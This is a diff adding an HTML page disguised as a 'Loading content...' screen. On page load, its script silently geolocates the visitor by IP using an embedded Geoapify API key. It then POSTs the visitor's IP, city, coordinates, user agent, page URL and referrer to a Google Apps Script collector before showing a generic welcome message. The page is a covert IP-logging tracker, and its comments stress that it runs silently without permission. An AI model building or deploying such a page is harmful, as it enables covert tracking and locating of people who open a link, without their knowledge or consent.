@@ -1,0 +1,109 @@
+<!-- <!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Quick Location</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style>body{font-family:sans-serif;margin:2rem} code{background:#f4f4f4;padding:.2rem .3rem}</style>
+  </head>
+  <body>
+    <script>
+      (async () => {
+        try {
+          // Geoapify: create a free API key and paste it below
+          const res = await fetch('https://api.geoapify.com/v1/ipinfo?apiKey=b45223731e024931bfb2369832d2fc7f');
+          const data = await res.json(); // returns country, city, lat/lon in JSON [5]
+          const loc = data.location || {};
+          const country = (data.country && data.country.name) || (data.country && data.country.iso_code) || 'Unknown';
+          const city = (data.city && data.city.name) || 'Unknown';
+          document.getElementById('out').textContent =
+            `City: ${city}, Country: ${country}, Lat: ${loc.latitude}, Lon: ${loc.longitude}`;
+        } catch (e) {
+          document.getElementById('out').textContent = 'Unable to detect location.';
+          console.error(e);
+        }
+      })();
+    </script>
+  </body>
+</html> -->
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Loading...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style>
+      body {
+        font-family: sans-serif;
+        margin: 2rem;
+        text-align: center;
+      }
+      .loading {
+        color: #666;
+        margin: 4rem auto;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="loading">
+      <h2>Loading content...</h2>
+      <p>Please wait a moment.</p>
+    </div>
+
+    <script>
+      (async () => {
+        try {
+          // Get location via IP (silent, no permission needed)
+          const res = await fetch(
+            "https://api.geoapify.com/v1/ipinfo?apiKey=b45223731e024931bfb2369832d2fc7f"
+          );
+          const data = await res.json();
+
+          // Extract location data
+          const loc = data.location || {};
+          const locationData = {
+            ip: data.ip || "",
+            city: (data.city && data.city.name) || "",
+            region: (data.state && data.state.name) || "",
+            country:
+              (data.country && data.country.name) ||
+              (data.country && data.country.iso_code) ||
+              "",
+            latitude: loc.latitude || "",
+            longitude: loc.longitude || "",
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            pageUrl: window.location.href,
+            referrer: document.referrer,
+          };
+
+          // Send to your collector (replace with your Google Apps Script URL)
+          await fetch(
+            "https://script.google.com/macros/s/AKfycbwm2_kxYQ_6ZtChUhb91jlnEpIBmPsRwL3RBKjmwKpqPSqvr9MW2io7dqczTy3fh2mn/exec",
+            {
+              method: "POST",
+              mode: "no-cors",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify(locationData),
+            }
+          );
+
+          // Optional: redirect to another page after data is collected
+          // window.location.href = 'https://example.com';
+
+          // Or show some content
+          document.body.innerHTML =
+            "<h2>Welcome!</h2><p>Thanks for visiting.</p>";
+        } catch (e) {
+          console.error("Error:", e);
+          // Still show content even if location fails
+          document.body.innerHTML =
+            "<h2>Welcome!</h2><p>Thanks for visiting.</p>";
+        }
+      })();
+    </script>
+  </body>
+</html>
